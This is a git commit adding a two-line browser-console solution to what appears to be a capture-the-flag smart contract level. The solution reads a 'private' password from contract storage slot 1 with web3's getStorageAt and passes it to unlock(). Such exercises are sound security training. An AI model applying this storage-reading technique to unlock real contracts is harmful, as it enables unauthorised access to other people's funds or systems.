fd051e460914d96928d4dcc931e59850a4e0e97a
Claudia <claudiabarcelovaldes40@gmail.com>
2023-02-17 17:29:49 +0100

    add lvl9 solution

---
+++ contracts/VaultLvl9.sol
@@ -0,0 +1,8 @@
+// no contract needed 
+
+// web3 documentation https://web3js.readthedocs.io/en/v1.8.2/web3-eth.html?highlight=getStorageAt
+
+
+// in the browser console 
+// var pass = await web3.eth.getStorageAt(contractAddr, 1)
+// await contract.unlock(pass)
